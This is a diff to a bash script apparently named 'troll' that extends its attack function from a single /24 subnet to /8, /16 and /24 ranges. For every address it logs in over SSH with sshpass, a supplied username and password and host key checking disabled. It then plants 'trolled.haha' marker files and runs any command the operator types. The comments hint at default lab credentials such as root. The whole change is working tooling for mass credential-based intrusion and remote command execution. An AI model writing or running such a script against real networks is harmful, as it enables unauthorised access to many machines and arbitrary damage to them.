@@ -35,7 +35,7 @@ function checkOption(){
                         echo '[*] You chose to attack'
                         read -p 'Username: ' USERNAME
                         read -p 'Password: ' PASSWORD
-                        read -p 'Subnet address (Example: 192.168.1): ' IP
+                        read -p 'IP address (Example: 192.168.1.16/24): ' IP
                         read -p 'Command to execute: ' $COMMAND
                         troll $USERNAME $PASSWORD $IP $COMMAND
                         ;;
@@ -68,15 +68,45 @@ function menu(){
 }
 
 function troll(){
-        USER=$1
-        PASSWORD=$2
-        SUBNET=$3 #'192.168.1'
-        echo "[*] Starting attack on subnet ${SUBNET}.0/24"
+        USER=$1 #'root'
+        PASSWORD=$2 #'labii'
+        IP=$(echo $3 | cut -d '/' -f 1)
+        RANGE=$(echo $3 | cut -d '/' -f 2)
+
         SECONDS=0
-        for COUNTER in $(seq 2 254); do
-                echo "[*] Attacking ${USER}@${SUBNET}.${COUNTER}"
-                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${SUBNET}.${COUNTER} "touch ~/trolled.haha; $COMMAND" 2>/dev/null &
-        done
+        case $RANGE in
+                8)
+                        SUBNET=$(echo $IP | cut -d '.' -f1)
+                        echo "[*] Starting attack on subnet ${SUBNET}.0.0.0/8"
+                        for ADDRESS in $SUBNET.{1..255}.{1..255}.{1..255}; do
+                                echo "[*] Attacking ${USER}@${ADDRESS}"
+                                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${ADDRESS} "if [ -e ~/trolled.haha ]; then touch ~/trolled.AGAIN.haha; fi; touch ~/trolled.haha; $COMMAND" 2>/dev/null &
+                        done
+                        ;;
+                16)
+                        SUBNET=$(echo $IP | cut -d '.' -f1,2)
+                        echo "[*] Starting attack on subnet ${SUBNET}.0.0/16"
+                        for ADDRESS in $SUBNET.{1..255}.{1..255}; do
+                                echo "[*] Attacking ${USER}@${ADDRESS}"
+                                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${ADDRESS} "if [ -e ~/trolled.haha ]; then touch ~/trolled.AGAIN.haha; fi; touch ~/trolled.haha; $COMMAND" 2>/dev/null &
+                        done
+                        ;;
+                24)
+                        SUBNET=$(echo $IP | cut -d '.' -f1,2,3)
+                        echo "[*] Starting attack on subnet ${SUBNET}.0/24"
+                        for COUNTER in $(seq 2 254); do
+                                echo "[*] Attacking ${USER}@${SUBNET}.${COUNTER}"
+                                sshpass -p${PASSWORD} ssh -t -oStrictHostKeyChecking=no ${USER}@${SUBNET}.${COUNTER} "if [ -e ~/trolled.haha ]; then touch ~/trolled.AGAIN.haha; fi; touch ~/trolled.haha; $COMMAND" 2>/dev/null &
+                        done
+                        ;;
+                *)
+                        echo '[-] Error: invalid range'
+                        return 1
+                        ;;
+        esac
+
+
+
         echo '[*] Attack done'
         ELAPSED_TIME="[*] Elapsed time: $(($SECONDS / 3600))hrs $((($SECONDS / 60) % 60))min $(($SECONDS % 60))sec"
         echo $ELAPSED_TIME
